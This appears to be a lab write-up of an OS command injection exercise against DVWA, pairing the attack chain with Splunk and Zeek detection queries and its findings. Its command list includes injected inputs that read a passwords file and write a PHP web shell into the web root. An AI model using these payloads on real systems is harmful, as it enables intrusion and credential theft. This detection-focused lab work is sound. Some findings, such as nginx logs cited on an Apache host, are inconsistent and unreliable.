# A05 — Command Injection (OS Command Injection via DVWA)

## Overview

This scenario simulates an OS command injection attack against DVWA (Damn Vulnerable Web Application) hosted on Windows 10. The attacker exploits an unsanitised input field to execute arbitrary OS commands via the web server process, escalating from web application access to full system shell.

**OWASP Category:** A03:2021 — Injection  
**MITRE ATT&CK:** T1190 (Exploit Public-Facing Application), T1059.003 (Windows Command Shell), T1003 (Credential Access)  
**Lab Date:** 5 June 2026  
**Victim:** Windows 10 — 10.10.10.10 (DVWA via XAMPP Apache)  
**Attacker:** Kali Linux — 10.10.10.5  
**SIEM:** Splunk Enterprise — Sysmon index  
**Network:** Zeek 8.0.8 — http.log  

---

## Attack Chain

| Phase | Action | MITRE | Tool |
|-------|--------|-------|------|
| 1 — Recon | Identify DVWA command injection input field | T1190 | Browser |
| 2 — Basic injection | `127.0.0.1 & whoami` — confirm RCE | T1059.003 | Browser |
| 3 — Enumeration | `127.0.0.1 & net user` — list accounts | T1087 | Browser |
| 4 — Privilege check | `127.0.0.1 & whoami /priv` | T1069 | Browser |
| 5 — File system recon | `127.0.0.1 & dir C:\` | T1083 | Browser |
| 6 — Credential access | `127.0.0.1 & type C:\xampp\passwords.txt` | T1003 | Browser |
| 7 — Web shell attempt | Write PHP web shell via echo command | T1505.003 | Browser |
| 8 — Persistence check | Check scheduled tasks and run keys | T1053, T1547 | Browser |
| 9 — Lateral prep | Attempt to reach other hosts | T1021 | Browser |
| 10 — Exfil simulation | Copy sensitive files to web root | T1041 | Browser |

---

## Key Commands

```bash
# Basic RCE confirmation
127.0.0.1 & whoami

# System enumeration
127.0.0.1 & systeminfo
127.0.0.1 & net user
127.0.0.1 & ipconfig /all

# Credential access
127.0.0.1 & type C:\xampp\passwords.txt
127.0.0.1 & dir C:\Users\shank\Documents\

# Web shell attempt
127.0.0.1 & echo ^<?php system($_GET['cmd']); ?^> > C:\xampp\htdocs\shell.php
```

---

## Detection — Splunk (Sysmon)

**Primary detection:** Sysmon EID 1 — httpd.exe spawning cmd.exe

```spl
index=sysmon EventCode=1 ParentImage="*httpd.exe*" Image="*cmd.exe*"
| table _time, Image, CommandLine, ParentImage, ProcessId, User
```

**Credential access detection:**
```spl
index=sysmon EventCode=1 ParentImage="*httpd.exe*"
| search CommandLine="*passwords*" OR CommandLine="*credential*" OR CommandLine="*ClinicData*"
| table _time, CommandLine, User
```

**Saved Alert:** `CMD Injection - Web Server Spawning Shell` — Critical, real-time

**Detection result:** 100% — all 10 phases detected via Sysmon EID 1

---

## Detection — Zeek (Kibana)

**Zeek http.log query:**
```
uri: *dvwa/vulnerabilities/exec*
```

Fields of interest: `uri`, `method`, `status_code`, `request_body_len`, `response_body_len`, `user_agent`

POST requests to `/dvwa/vulnerabilities/exec/` with growing `response_body_len` indicate successful command execution — output returned in HTTP response body.

---

## Key Findings

- **httpd.exe spawning cmd.exe** is a definitive indicator — Apache should never launch a system shell
- **MariaDB `secure_file_priv`** prevented web shell write to arbitrary paths — defence in depth working
- **POST body not captured** by nginx access logs — payload-based detection blind; behavioural correlation required
- **CVSS v4.0 Base Score:** 9.3 (Critical) — unauthenticated RCE with system-level command execution

---

## Regulatory Mapping

| Framework | Control | Relevance |
|-----------|---------|-----------|
| NIST CSF | DE.CM-7 | Splunk detecting unauthorised process spawning |
| ISO 27001 | A.8.15 | Sysmon audit trail of all process creation events |
| OWASP WSTG | WSTG-INPV-12 | OS Command Injection testing |
| ACSC Essential Eight | Application Control | Unsigned binaries executed via web server — policy violation |

---

## Files

- `detections/scenario05_cmdinject.spl` — All Splunk detection queries
- `findings/scenario05_findings.md` — Detailed findings and evidence
- `Scenario05_CommandInjection_Playbook_v2.docx` — Full playbook (local)
